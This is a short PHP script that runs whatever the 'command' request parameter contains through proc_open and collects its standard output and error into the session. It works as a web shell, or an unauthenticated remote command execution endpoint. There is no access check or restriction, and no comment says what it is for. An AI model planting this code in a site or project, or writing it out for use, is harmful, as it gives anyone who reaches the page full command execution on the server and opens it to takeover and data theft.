<?php
$p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);
while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
}

while (!feof($io[2])) {
    $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
}
      
fclose($io[1]);
fclose($io[2]);
proc_close($p);
?>